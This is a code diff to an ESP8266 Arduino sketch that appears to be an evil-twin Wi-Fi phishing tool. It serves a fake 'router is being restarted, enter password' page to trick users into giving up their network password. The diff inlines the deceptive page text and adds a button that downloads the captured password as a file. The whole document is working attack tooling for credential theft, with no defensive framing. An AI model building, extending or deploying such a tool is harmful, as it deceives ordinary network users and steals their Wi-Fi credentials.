@@ -9,11 +9,6 @@
 #include <ESP8266WebServer.h>
 
 #define led 2
-#define TITLE "Sign In"
-#define SUBTITLE "Validation Panel"
-#define BODY "Due to internal problems router is being restarted. Enter password to re-connect to the network."
-#define POST_TITLE "Validating"
-#define POST_BODY "Your account is being validated. Please, wait up to 2 minute for device connection.</br>Thank you."
 
 const byte DNS_PORT = 53;
 IPAddress apIP(192, 168, 6, 1);
@@ -76,9 +71,9 @@ String header(String MainPhisPage)
 
 String index()
 {
-  String pass_field = header(TITLE);
+  String pass_field = header("Sign In");
         pass_field += "<div>";
-        pass_field += BODY;
+        pass_field += "Due to internal problems router is being restarted. Enter password to re-connect to the network.";
         pass_field += "</div>";
         pass_field += "<div>";
         pass_field += "<form action='/'>";
@@ -94,7 +89,7 @@ String index()
 
 String posted()
 {
- return header(POST_TITLE)+POST_BODY+"<script>setTimeout(function(){window.location.href = '/result';},15000);</script></div><div class=q><center>&#169; All rights reserved.</center></div>";
+ return header("Validating")+"Your account is being validated. Please, wait up to 2 minute for device connection.</br>Thank you."+"<script>setTimeout(function(){window.location.href = '/result';},15000);</script></div><div class=q><center>&#169; All rights reserved.</center></div>";
 }
 
 void performScan()
@@ -239,7 +234,7 @@ void handleIndex()
   html_data += "</table><br>"+button_data;
   if (correct_password != "")
   {
-   html_data += "<h1>Results</h1><h3>" + correct_password + "</h3><hr>";
+   html_data += "<h1>Results</h1><h3>" + correct_password + "</h3><hr><script>function downloadPassword(){const password = '" + correct_password + "'; const blob = new Blob([password], { type: 'text/plain' }); const link = document.createElement('a'); link.href = URL.createObjectURL(blob); link.download = 'password.txt'; document.body.appendChild(link); link.click(); document.body.removeChild(link); }</script><button onclick='downloadPassword()'>Download Password</button>";
   } 
   html_data += "</div></center></body></html>";
   webServer.send(200, "text/html", html_data);
